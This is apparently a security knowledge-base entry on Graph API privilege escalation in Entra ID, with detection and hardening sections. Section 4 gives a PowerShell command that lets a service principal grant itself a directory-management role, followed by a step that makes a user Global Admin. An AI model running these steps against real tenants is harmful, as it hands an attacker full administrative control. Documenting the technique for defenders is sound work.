# [PE-ELEVATE-005]: Graph API Permission Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-005 |
| **MITRE ATT&CK v18.1** | [Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Graph API |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Application Permission `AppRoleAssignment.ReadWrite.All` is dangerous. It allows the Service Principal holding it to grant *any* App Role to *any* Service Principal (including itself). This means a Service Principal with this permission can assign itself `RoleManagement.ReadWrite.Directory` (which allows promoting users to Global Admin). This is a direct path to Global Admin.
- **Attack Surface:** Graph API Permissions.
- **Business Impact:** **Invisible God Mode**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Service Principal with `AppRoleAssignment.ReadWrite.All`.
- **Tools:**
    - PowerShell (`MgGraph`)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Self-Promote**
Assign `RoleManagement.ReadWrite.Directory` to self.
```powershell
$GraphAppId = "00000003-0000-0000-c000-000000000000" # MS Graph
$RoleID = "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" # RoleManagement...
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <MySP_ID> -PrincipalId <MySP_ID> -ResourceId <GraphSP_ID> -AppRoleId $RoleID
```

**Step 2: Promote User**
Now use the new capability to make a user Global Admin.
```bash
az ad directory role member add ...
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Add app role assignment to service principal` | A Service Principal assigning a high-privilege role (like RoleManagement) to itself. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Audit Permissions:** Strictly monitor `AppRoleAssignment.ReadWrite.All`. It is functionally equivalent to Global Admin.
*   **Admin Consent:** Ensure only Global Admins can consent to this permission.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-ACCTMGMT-001]
> **Next Logical Step:** [PE-VALID-011]
